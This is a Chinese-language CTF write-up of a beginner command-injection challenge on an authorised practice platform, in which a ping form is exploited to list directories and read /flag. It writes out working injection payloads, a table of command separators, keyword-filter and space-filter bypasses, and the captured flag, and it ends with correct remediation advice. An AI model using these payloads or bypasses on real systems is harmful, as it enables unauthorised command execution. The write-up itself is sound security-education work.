# CTF 练习：[ACTF2020 新生赛]Exec（命令注入）

> 平台：CTF² / BUUCTF 练习（Web · 简单 · 1 分，5784 人解出）
> 环境：Kali + 浏览器
> 日期：2026-11-20
> 性质：平台提供的授权靶场

---

## 一、目标

PING 页面把用户输入拼进系统命令，通过命令分隔符注入 `ls`/`cat`，读取 `/flag`。

## 二、复现

### 2.1 正常功能

输入 `127.0.0.1` → 页面返回 ping 结果：

```
PING 127.0.0.1 ... 3 packets transmitted, 3 received, 0% packet loss
```

说明后端执行的是类似：

```bash
ping -c 3 <用户输入>
```

### 2.2 测试命令分隔符

输入：

```
127.0.0.1;ls
```

输出末尾出现 `index.php` —— **`;` 生效，命令注入成立**。

### 2.3 找 flag

```
127.0.0.1;ls /
```

根目录列表中出现 `flag`。

### 2.4 读 flag

```
127.0.0.1;cat /flag
```

得到：

```
CTF2{98aab10a-85e8-4f5e-982b-922578cfc7e0}
```

## 二·五、复盘四问

### 推理链（为什么这么做）

**第 1 步：为什么先输 `127.0.0.1`**

- 我在想：这是 ping 功能，先确认正常行为，建立基线。
- 验证：返回 ping 统计，说明后端执行了 `ping -c 3 <输入>`。
- 所以：输入进入了 shell 命令。

**第 2 步：为什么用 `;` 而不是 `|`**

- 我在想：`;` 是最直接的命令分隔符，先试最简单的。
- 验证：`127.0.0.1;ls` 输出末尾出现 `index.php`。
- 所以：`;` 被 shell 解释，第二条命令执行了。

**第 3 步：为什么先 `ls /` 再 `cat`**

- 我在想：flag 路径未知，先列目录比盲猜快。
- 验证：根目录有 `flag`。
- 所以：直接 `cat /flag`。

### 载荷是怎么来的

- **来源**：手工输入。
- **为什么要带合法 IP**：后端可能先校验「是不是 IP」，带上前缀能过校验。
- **为什么用 `;`**：shell 的命令分隔符。

### 逐段解释

| 片段 | 作用 |
|---|---|
| `127.0.0.1` | 满足「看起来像目标地址」的前置校验 |
| `;` | 结束 ping，开始新命令 |
| `ls /` | 列根目录，定位 flag |
| `cat /flag` | 读文件 |

### 失败尝试与坑

| 现象 | 原因 | 解决 |
|---|---|---|
| 只回 ping 结果 | 分隔符不对 | 换 `\|`、`&&`、`\|\|` |
| `cat` 没输出 | 路径不对 | 先 `ls /` |
| `flag` 被过滤 | 关键字黑名单 | `ca\t`、`fla''g` 拼接 |

### 自测

**Q1**：命令注入的判定标准？
**A**：分隔符能让「第二条命令」执行，而不是只回显原文。

**Q2**：为什么先 `ls /`？
**A**：避免盲猜路径，先定位再读。

**Q3**：正确修复？
**A**：不拼 shell（参数化调用），而不是过滤分号。

## 三、原理

| 点 | 说明 |
|---|---|
| 命令拼接 | 后端把用户输入直接拼进 shell 命令执行 |
| 分隔符 | `;` `|` `||` `&&` `$()` 反引号 都可串联新命令 |
| 无过滤 | 输入没做黑名单/白名单校验 |

## 四、常见分隔符与绕过

```bash
127.0.0.1;id
127.0.0.1|id
127.0.0.1||id
127.0.0.1&&id
127.0.0.1$(id)
127.0.0.1`id`
```

| 被过滤 | 绕过 |
|---|---|
| 空格 | `$IFS`、`${IFS}`、`<` |
| `cat` | `tac`、`more`、`head`、`strings`、`nl` |
| 分号 | `|`、`&&`、换行 `%0a` |

## 五、修复

| 措施 | 说明 |
|---|---|
| **不调用 shell** | 用语言内置 API（如 Python `subprocess.run([...], shell=False)`） |
| 参数白名单 | 严格校验输入是合法 IPv4/域名 |
| 转义 | 或使用 `escapeshellarg()` |
| 最小权限 | Web 进程不用 root |
| 禁用危险函数 | 禁用 `system`/`exec`/`shell_exec` 等 |

## 六、踩坑

- 输入必须是「合法 IP + 分隔符 + 命令」，否则前端校验可能拦截
- `cat /flag` 没输出时，先 `ls /` 确认路径
- 有些环境会过滤 `flag` 字样，用 `ca\t`、`fla''g` 等拼接绕过

## 七、收获

- 命令注入的判定：**分隔符能让第二条命令执行**。
- 读文件前先 `ls` 定位，别盲猜路径。
- 修复的核心是「不拼 shell」而不是「过滤分号」。
